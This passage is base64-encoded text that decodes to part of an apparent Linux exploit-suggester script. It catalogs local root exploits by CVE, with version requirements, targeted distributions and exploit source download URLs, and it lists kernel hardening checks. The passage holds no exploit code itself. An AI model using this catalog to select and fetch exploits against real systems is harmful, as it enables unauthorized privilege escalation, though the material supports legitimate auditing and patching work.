y11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNy8wNi8xOS9zdGFjay1jbGFzaC9zdGFjay1jbGFzaC50eHQKc3JjLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA2LzE5L3N0YWNrLWNsYXNoL2xpbnV4X2xkc29faHdjYXAuYwpleHBsb2l0LWRiOiA0MjI3NAphdXRob3I6IFF1YWx5cwpDb21tZW50czogVXNlcyAiU3RhY2sgQ2xhc2giIHRlY2huaXF1ZSwgd29ya3MgYWdhaW5zdCBtb3N0IFNVSUQtcm9vdCBiaW5hcmllcwpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy0xMDAwMzY2LENWRS0yMDE3LTEwMDAzNzFdJHt0eHRyc3R9IGxpbnV4X2xkc29fZHluYW1pYwpSZXFzOiBwa2c9Z2xpYmN8bGliYzYsdmVyPD0yLjI1LHg4NgpUYWdzOiBkZWJpYW49OXwxMCx1YnVudHU9MTQuMDQuNXwxNi4wNC4yfDE3LjA0LGZlZG9yYT0yM3wyNHwyNQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA2LzE5L3N0YWNrLWNsYXNoL3N0YWNrLWNsYXNoLnR4dApzcmMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDYvMTkvc3RhY2stY2xhc2gvbGludXhfbGRzb19keW5hbWljLmMKZXhwbG9pdC1kYjogNDIyNzYKYXV0aG9yOiBRdWFseXMKQ29tbWVudHM6IFVzZXMgIlN0YWNrIENsYXNoIiB0ZWNobmlxdWUsIHdvcmtzIGFnYWluc3QgbW9zdCBTVUlELXJvb3QgUElFcwpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy0xMDAwMzY2LENWRS0yMDE3LTEwMDAzNzldJHt0eHRyc3R9IGxpbnV4X2xkc29faHdjYXBfNjQKUmVxczogcGtnPWdsaWJjfGxpYmM2LHZlcjw9Mi4yNSx4ODZfNjQKVGFnczogZGViaWFuPTcuN3w4LjV8OS4wLHVidW50dT0xNC4wNC4yfDE2LjA0LjJ8MTcuMDQsZmVkb3JhPTIyfDI1LGNlbnRvcz03LjMuMTYxMQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA2LzE5L3N0YWNrLWNsYXNoL3N0YWNrLWNsYXNoLnR4dApzcmMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDYvMTkvc3RhY2stY2xhc2gvbGludXhfbGRzb19od2NhcF82NC5jCmV4cGxvaXQtZGI6IDQyMjc1CmF1dGhvcjogUXVhbHlzCkNvbW1lbnRzOiBVc2VzICJTdGFjayBDbGFzaCIgdGVjaG5pcXVlLCB3b3JrcyBhZ2FpbnN0IG1vc3QgU1VJRC1yb290IGJpbmFyaWVzCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAzNzAsQ1ZFLTIwMTctMTAwMDM3MV0ke3R4dHJzdH0gbGludXhfb2Zmc2V0MmxpYgpSZXFzOiBwa2c9Z2xpYmN8bGliYzYsdmVyPD0yLjI1LHg4NgpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA2LzE5L3N0YWNrLWNsYXNoL3N0YWNrLWNsYXNoLnR4dApzcmMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDYvMTkvc3RhY2stY2xhc2gvbGludXhfb2Zmc2V0MmxpYi5jCmV4cGxvaXQtZGI6IDQyMjczCmF1dGhvcjogUXVhbHlzCkNvbW1lbnRzOiBVc2VzICJTdGFjayBDbGFzaCIgdGVjaG5pcXVlCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE4LTEwMDAwMDFdJHt0eHRyc3R9IFJhdGlvbmFsTG92ZQpSZXFzOiBwa2c9Z2xpYmN8bGliYzYsdmVyPDIuMjcsQ09ORklHX1VTRVJfTlM9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF91c2VybnNfY2xvbmU9PTEseDg2XzY0ClRhZ3M6IGRlYmlhbj05e2xpYmM2OjIuMjQtMTErZGViOXUxfSx1YnVudHU9MTYuMDQuM3tsaWJjNjoyLjIzLTB1YnVudHU5fQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cuaGFsZmRvZy5uZXQvU2VjdXJpdHkvMjAxNy9MaWJjUmVhbHBhdGhCdWZmZXJVbmRlcmZsb3cvCnNyYy11cmw6IGh0dHBzOi8vd3d3LmhhbGZkb2cubmV0L1NlY3VyaXR5LzIwMTcvTGliY1JlYWxwYXRoQnVmZmVyVW5kZXJmbG93L1JhdGlvbmFsTG92ZS5jCkNvbW1lbnRzOiBrZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT0xIHJlcXVpcmVkCmJpbi11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsvbWFzdGVyL2RhdGEvZXhwbG9pdHMvY3ZlLTIwMTgtMTAwMDAwMS9SYXRpb25hbExvdmUKZXhwbG9pdC1kYjogNDM3NzUKYXV0aG9yOiBoYWxmZG9nCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE4LTEwOTAwXSR7dHh0cnN0fSB2cG5jX3ByaXZlc2MucHkKUmVxczogcGtnPW5ldHdvcmttYW5hZ2VyLXZwbmN8bmV0d29yay1tYW5hZ2VyLXZwbmMsdmVyPDEuMi42ClRhZ3M6IHVidW50dT0xNi4wNHtuZXR3b3JrLW1hbmFnZXItdnBuYzoxLjEuOTMtMX0sZGViaWFuPTkuMHtuZXR3b3JrLW1hbmFnZXItdnBuYzoxLjIuNC00fSxtYW5qYXJvPTE3ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3B1bHNlc2VjdXJpdHkuY28ubnovYWR2aXNvcmllcy9OTS1WUE5DLVByaXZlc2MKc3JjLXVybDogaHR0cHM6Ly9idWd6aWxsYS5ub3ZlbGwuY29tL2F0dGFjaG1lbnQuY2dpP2lkPTc3OTExMApleHBsb2l0LWRiOiA0NTMxMwphdXRob3I6IERlbmlzIEFuZHpha292aWMKQ29tbWVudHM6IERpc3Ryb3MgdXNlIG93biB2ZXJzaW9uaW5nIHNjaGVtZS4gTWFudWFsIHZlcmlmaWNhdGlvbiBuZWVkZWQuCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE4LTE0NjY1XSR7dHh0cnN0fSByYXB0b3JfeG9yZ3kKUmVxczogcGtnPXhvcmcteDExLXNlcnZlci1Yb3JnLGNtZDpbIC11IC91c3IvYmluL1hvcmcgXQpUYWdzOiBjZW50b3M9Ny40ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5zZWN1cmVwYXR0ZXJucy5jb20vMjAxOC8xMC9jdmUtMjAxOC0xNDY2NS14b3JnLXgtc2VydmVyLmh0bWwKZXhwbG9pdC1kYjogNDU5MjIKYXV0aG9yOiByYXB0b3IKQ29tbWVudHM6IFguT3JnIFNlcnZlciBiZWZvcmUgMS4yMC4zIGlzIHZ1bG5lcmFibGUuIERpc3Ryb3MgdXNlIG93biB2ZXJzaW9uaW5nIHNjaGVtZS4gTWFudWFsIHZlcmlmaWNhdGlvbiBuZWVkZWQuCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE5LTczMDRdJHt0eHRyc3R9IGRpcnR5X3NvY2sKUmVxczogcGtnPXNuYXBkLHZlcjwyLjM3LGNtZDpbIC1TIC9ydW4vc25hcGQuc29ja2V0IF0KVGFnczogdWJ1bnR1PTE4LjEwLG1pbnQ9MTkKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vaW5pdGJsb2cuY29tLzIwMTkvZGlydHktc29jay8KZXhwbG9pdC1kYjogNDYzNjEKZXhwbG9pdC1kYjogNDYzNjIKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL2luaXRzdHJpbmcvZGlydHlfc29jay9hcmNoaXZlL21hc3Rlci56aXAKYXV0aG9yOiBJbml0U3RyaW5nCkNvbW1lbnRzOiBEaXN0cm9zIHVzZSBvd24gdmVyc2lvbmluZyBzY2hlbWUuIE1hbnVhbCB2ZXJpZmljYXRpb24gbmVlZGVkLgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxOS0xMDE0OV0ke3R4dHJzdH0gcmFwdG9yX2V4aW1fd2l6ClJlcXM6IHBrZz1leGltfGV4aW00LHZlcj49NC44Nyx2ZXI8PTQuOTEKVGFnczoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxOS8wNi8wNS9jdmUtMjAxOS0xMDE0OS9yZXR1cm4td2l6YXJkLXJjZS1leGltLnR4dApleHBsb2l0LWRiOiA0Njk5NgphdXRob3I6IHJhcHRvcgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxOS0xMjE4MV0ke3R4dHJzdH0gU2Vydi1VIEZUUCBTZXJ2ZXIKUmVxczogY21kOlsgLXUgL3Vzci9sb2NhbC9TZXJ2LVUvU2Vydi1VIF0KVGFnczogZGViaWFuPTkKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vYmxvZy52YXN0YXJ0LmRldi8yMDE5LzA2L2N2ZS0yMDE5LTEyMTgxLXNlcnYtdS1leHBsb2l0LXdyaXRldXAuaHRtbApleHBsb2l0LWRiOiA0NzAwOQpzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZ3V5d2hhdGFndXkvQ1ZFLTIwMTktMTIxODEvbWFzdGVyL3NlcnZ1LXBlLWN2ZS0yMDE5LTEyMTgxLmMKZXh0LXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jjb2xlcy9sb2NhbC1leHBsb2l0cy9tYXN0ZXIvQ1ZFLTIwMTktMTIxODEvU1Vyb290CmF1dGhvcjogR3V5IExldmluIChvcmdpbmFsIGV4cGxvaXQgYXV0aG9yKTsgQnJlbmRhbiBDb2xlcyAoYXV0aG9yIG9mIGV4cGxvaXQgdXBkYXRlIGF0ICdleHQtdXJsJykKQ29tbWVudHM6IE1vZGlmaWVkIHZlcnNpb24gYXQgJ2V4dC11cmwnIHVzZXMgYmFzaCBleGVjIHRlY2huaXF1ZSwgcmF0aGVyIHRoYW4gY29tcGlsaW5nIHdpdGggZ2NjLgpFT0YKKQpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE5LTE4ODYyXSR7dHh0cnN0fSBHTlUgTWFpbHV0aWxzIDIuMCA8PSAzLjcgbWFpZGFnIHVybCBsb2NhbCByb290IChDVkUtMjAxOS0xODg2MikKUmVxczogY21kOlsgLXUgL3Vzci9sb2NhbC9zYmluL21haWRhZyBdClRhZ3M6IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cubWlrZS1ndWFsdGllcmkuY29tL3Bvc3RzL2ZpbmRpbmctYS1kZWNhZGUtb2xkLWZsYXctaW4tZ251LW1haWx1dGlscwpleHQtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vYmNvbGVzL2xvY2FsLWV4cGxvaXRzL3Jhdy9tYXN0ZXIvQ1ZFLTIwMTktMTg4NjIvZXhwbG9pdC5jcm9uLnNoCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9iY29sZXMvbG9jYWwtZXhwbG9pdHMvcmF3L21hc3Rlci9DVkUtMjAxOS0xODg2Mi9leHBsb2l0LmxkcHJlbG9hZC5zaAphdXRob3I6IGJjb2xlcwpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxOS0xODYzNF0ke3R4dHJzdH0gc3VkbyBwd2ZlZWRiYWNrClJlcXM6IHBrZz1zdWRvLHZlcjwxLjguMzEKVGFnczogbWludD0xOQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9keWxhbmthdHouY29tL0FuYWx5c2lzLW9mLUNWRS0yMDE5LTE4NjM0LwpzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vc2FsZWVtcmFzaGlkL3N1ZG8tY3ZlLTIwMTktMTg2MzQvcmF3L21hc3Rlci9leHBsb2l0LmMKYXV0aG9yOiBzYWxlZW1yYXNoaWQKQ29tbWVudHM6IHN1ZG8gY29uZmlndXJhdGlvbiByZXF1aXJlcyBwd2ZlZWRiYWNrIHRvIGJlIGVuYWJsZWQuCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDIwLTk0NzBdJHt0eHRyc3R9IFdpbmcgRlRQIFNlcnZlciA8PSA2LjIuNSBMUEUKUmVxczogY21kOlsgLXggL2V0Yy9pbml0LmQvd2Z0cHNlcnZlciBdClRhZ3M6IHVidW50dT0xOApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cuaG9vcGVybGFicy54eXovZGlzY2xvc3VyZXMvY3ZlLTIwMjAtOTQ3MC5waHAKc3JjLXVybDogaHR0cHM6Ly93d3cuaG9vcGVybGFicy54eXovZGlzY2xvc3VyZXMvY3ZlLTIwMjAtOTQ3MC5zaApleHBsb2l0LWRiOiA0ODE1NAphdXRob3I6IENhcnkgQ29vcGVyCkNvbW1lbnRzOiBSZXF1aXJlcyBhbiBhZG1pbmlzdHJhdG9yIHRvIGxvZ2luIHZpYSB0aGUgd2ViIGludGVyZmFjZS4KRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMjEtMzE1Nl0ke3R4dHJzdH0gc3VkbyBCYXJvbiBTYW1lZGl0ClJlcXM6IHBrZz1zdWRvLHZlcjwxLjkuNXAyClRhZ3M6IG1pbnQ9MTksdWJ1bnR1PTE4fDIwLCBkZWJpYW49MTAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAyMS8wMS8yNi9jdmUtMjAyMS0zMTU2L2Jhcm9uLXNhbWVkaXQtaGVhcC1iYXNlZC1vdmVyZmxvdy1zdWRvLnR4dApzcmMtdXJsOiBodHRwczovL2NvZGVsb2FkLmdpdGh1Yi5jb20vYmxhc3R5L0NWRS0yMDIxLTMxNTYvemlwL21haW4KYXV0aG9yOiBibGFzdHkKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMjEtMzE1Nl0ke3R4dHJzdH0gc3VkbyBCYXJvbiBTYW1lZGl0IDIKUmVxczogcGtnPXN1ZG8sdmVyPDEuOS41cDIKVGFnczogY2VudG9zPTZ8N3w4LHVidW50dT0xNHwxNnwxN3wxOHwxOXwyMCwgZGViaWFuPTl8MTAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAyMS8wMS8yNi9jdmUtMjAyMS0zMTU2L2Jhcm9uLXNhbWVkaXQtaGVhcC1iYXNlZC1vdmVyZmxvdy1zdWRvLnR4dApzcmMtdXJsOiBodHRwczovL2NvZGVsb2FkLmdpdGh1Yi5jb20vd29yYXdpdC9DVkUtMjAyMS0zMTU2L3ppcC9tYWluCmF1dGhvcjogd29yYXdpdApFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy01NjE4XSR7dHh0cnN0fSBzZXR1aWQgc2NyZWVuIHY0LjUuMCBMUEUKUmVxczogcGtnPXNjcmVlbix2ZXI9PTQuNS4wClRhZ3M6IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9zZWNsaXN0cy5vcmcvb3NzLXNlYy8yMDE3L3ExLzE4NApleHBsb2l0LWRiOiBodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy80MTE1NApFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMS00MDM0XSR7dHh0cnN0fSBQd25LaXQKUmVxczogcGtnPXBvbGtpdHxwb2xpY3lraXQtMSx2ZXI8PTAuMTA1LTMxClRhZ3M6IHVidW50dT0xMHwxMXwxMnwxM3wxNHwxNXwxNnwxN3wxOHwxOXwyMHwyMSxkZWJpYW49N3w4fDl8MTB8MTEsZmVkb3JhLG1hbmphcm8KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAyMi8wMS8yNS9jdmUtMjAyMS00MDM0L3B3bmtpdC50eHQKc3JjLXVybDogaHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2JlcmRhdi9DVkUtMjAyMS00MDM0L3ppcC9tYWluCmF1dGhvcjogYmVyZGF2CkVPRgopCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyBzZWN1cml0eSByZWxhdGVkIEhXL2tlcm5lbCBmZWF0dXJlcwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpuPTAKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCnNlY3Rpb246IE1haW5saW5lIGtlcm5lbCBwcm90ZWN0aW9uIG1lY2hhbmlzbXM6CkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBLZXJuZWwgUGFnZSBUYWJsZSBJc29sYXRpb24gKFBUSSkgc3VwcG9ydAphdmFpbGFibGU6IHZlcj49NC4xNQplbmFibGVkOiBjbWQ6Z3JlcCAtRXFpICdcc3B0aScgL3Byb2MvY3B1aW5mbwphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3B0aS5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogR0NDIHN0YWNrIHByb3RlY3RvciBzdXBwb3J0CmF2YWlsYWJsZTogQ09ORklHX0hBVkVfU1RBQ0tQUk9URUNUT1I9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3N0YWNrcHJvdGVjdG9yLXJlZ3VsYXIubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEdDQyBzdGFjayBwcm90ZWN0b3IgU1RST05HIHN1cHBvcnQKYXZhaWxhYmxlOiBDT05GSUdfU1RBQ0tQUk9URUNUT1JfU1RST05HPXksdmVyPj0zLjE0CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvc3RhY2twcm90ZWN0b3Itc3Ryb25nLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBMb3cgYWRkcmVzcyBzcGFjZSB0byBwcm90ZWN0IGZyb20gdXNlciBhbGxvY2F0aW9uCmF2YWlsYWJsZTogQ09ORklHX0RFRkFVTFRfTU1BUF9NSU5fQUREUj1bMC05XSsKZW5hYmxlZDogc3lzY3RsOnZtLm1tYXBfbWluX2FkZHIhPTAKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9tbWFwX21pbl9hZGRyLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBQcmV2ZW50IHVzZXJzIGZyb20gdXNpbmcgcHRyYWNlIHRvIGV4YW1pbmUgdGhlIG1lbW9yeSBhbmQgc3RhdGUgb2YgdGhlaXIgcHJvY2Vzc2VzCmF2YWlsYWJsZTogQ09ORklHX1NFQ1VSSVRZX1lBTUE9eQplbmFibGVkOiBzeXNjdGw6a2VybmVsLnlhbWEucHRyYWNlX3Njb3BlIT0wCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMveWFtYV9wdHJhY2Vfc2NvcGUubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFJlc3RyaWN0IHVucHJpdmlsZWdlZCBhY2Nlc3MgdG8ga2VybmVsIHN5c2xvZwphdmFpbGFibGU6IENPTkZJR19TRUNVUklUWV9ETUVTR19SRVNUUklDVD15LHZlcj49Mi42LjM3CmVuYWJsZWQ6IHN5c2N0bDprZXJuZWwuZG1lc2dfcmVzdHJpY3QhPTAKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9kbWVzZ19yZXN0cmljdC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogUmFuZG9taXplIHRoZSBhZGRyZXNzIG9mIHRoZSBrZXJuZWwgaW1hZ2UgKEtBU0xSKQphdmFpbGFibGU6IENPTkZJR19SQU5ET01JWkVfQkFTRT15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMva2FzbHIubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEhhcmRlbmVkIHVzZXIgY29weSBzdXBwb3J0CmF2YWlsYWJsZTogQ09ORklHX0hBUkRFTkVEX1VTRVJDT1BZPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9oYXJkZW5lZF91c2VyY29weS5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogTWFrZSBrZXJuZWwgdGV4dCBhbmQgcm9kYXRhIHJlYWQtb25seQphdmFpbGFibGU6IENPTkZJR19TVFJJQ1RfS0VSTkVMX1JXWD15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvc3RyaWN0X2tlcm5lbF9yd3gubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFNldCBsb2FkYWJsZSBrZXJuZWwgbW9kdWxlIGRhdGEgYXMgTlggYW5kIHRleHQgYXMgUk8KYXZhaWxhYmxlOiBDT05GSUdfU1RSSUNUX01PRFVMRV9SV1g9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3N0cmljdF9tb2R1bGVfcnd4Lm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBCVUcoKSBjb25kaXRpb25zIHJlcG9ydGluZwphdmFpbGFibGU6IENPTkZJR19CVUc9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2J1Zy5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogQWRkaXRpb25hbCAnY3JlZCcgc3RydWN0IGNoZWNrcwphdmFpbGFibGU6IENPTkZJR19ERUJVR19DUkVERU5USUFMUz15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvZGVidWdfY3JlZGVudGlhbHMubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFNhbml0eSBjaGVja3MgZm9yIG5vdGlmaWVyIGNhbGwgY2hhaW5zCmF2YWlsYWJsZTogQ09ORklHX0RFQlVHX05PVElGSUVSUz15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvZGVidWdfbm90aWZpZXJzLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBFeHRlbmRlZCBjaGVja3MgZm9yIGxpbmtlZC1saXN0cyB3YWxraW5nCmF2YWlsYWJsZTogQ09ORklHX0RFQlVHX0xJU1Q9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2RlYnVnX2xpc3QubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IENoZWNrcyBvbiBzY2F0dGVyLWdhdGhlciB0YWJsZXMKYXZhaWxhYmxlOiBDT05GSUdfREVCVUdfU0c9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2RlYnVnX3NnLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBDaGVja3MgZm9yIGRhdGEgc3RydWN0dXJlIGNvcnJ1cHRpb25zCmF2YWlsYWJsZTogQ09ORklHX0JVR19PTl9EQVRBX0NPUlJVUFRJT049eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2J1Z19vbl9kYXRhX2NvcnJ1cHRpb24ubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IENoZWNrcyBmb3IgYSBzdGFjayBvdmVycnVuIG9uIGNhbGxzIHRvICdzY2hlZHVsZScKYXZhaWxhYmxlOiBDT05GSUdfU0NIRURfU1RBQ0tfRU5EX0NIRUNLPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9zY2hlZF9zdGFja19lbmRfY2hlY2subWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEZyZWVsaXN0IG9yZGVyIHJhbmRvbWl6YXRpb24gb24gbmV3IHBhZ2VzIGNyZWF0aW9uCmF2YWlsYWJsZTogQ09ORklHX1NMQUJfRlJFRUxJU1RfUkFORE9NPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9zbGFiX2ZyZWVsaXN0X3JhbmRvbS5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogRnJlZWxpc3QgbWV0YWRhdGEgaGFyZGVuaW5nCmF2YWlsYWJsZTogQ09ORklHX1NMQUJfRlJFRUxJU1RfSEFSREVORUQ9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3NsYWJfZnJlZWxpc3RfaGFyZGVuZWQubWQKRU9GCikKCkZFQVRVUkVT